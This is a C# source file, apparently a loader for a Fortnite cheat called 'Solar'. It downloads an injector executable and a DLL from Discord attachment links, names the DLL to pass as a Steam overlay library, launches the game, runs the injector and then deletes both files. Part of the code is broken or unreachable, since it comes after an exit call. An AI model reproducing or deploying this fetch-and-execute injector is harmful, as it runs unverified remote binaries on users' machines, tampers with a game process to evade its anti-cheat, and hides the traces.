
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.IO;
using System.Net;
using System.Threading;
using System.Runtime.InteropServices;

namespace solarfn
{
	internal class main
	{
		public static async Task InjectOrMonkeyAsync()
		{
			Console.ForegroundColor = ConsoleColor.Cyan;


			WebClient webClient = new WebClient();
			Directory.CreateDirectory("C:\\Solar\\");
			string text = "C:\\Solar\\GameOverlayRenderer.dll"; 
			string text1 = "C:\\Solar\\soular.exe";
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/886101390722732052/886114609206034482/inject.exe", text1);
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/886101390722732052/886112994109587536/solar.dll", text); // DOWNLOADS MAIN FILES
			Process process = new Process();



			Thread.Sleep(3000);
			process.Close();
			Console.Clear();
			randomtittle.Print("\n Solar is starting fortnite, please be patient.");
			var Proc = new ProcessStartInfo();
			Proc.CreateNoWindow = false;
			Proc.FileName = "cmd.exe";
			Proc.Arguments = "/C start com.epicgames.launcher://apps/Fortnite?action=launch";
			Process.Start(Proc);
			randomtittle.Print("\n Waiting for remote execution . . .");
			Thread.Sleep(30000);

			Process.Start(text1);
			Thread.Sleep(4000);
			
			File.Delete(text);
			File.Delete(text1);
			Environment.Exit(1);
			await Task.Delay(90000);
			var fortnite = Process.GetProcessesByName("FortniteClient-Win64-Shipping")[0];
			fortnite.WaitForExit();
			Console.Clear();
			randomtittle.Print("Would you like to verify fortnite? Y/N >");
			var read = Console.ReadLine().ToLower();
			if (read == "y")
			{
				Proc.Arguments = "/C start com.epicgames.launcher://apps/Fortnite?action=verify";
				Process.Start(Proc);
				Environment.Exit(1);
			}
			else
			{
				Environment.Exit(1);
			}
		}

		
	}
}
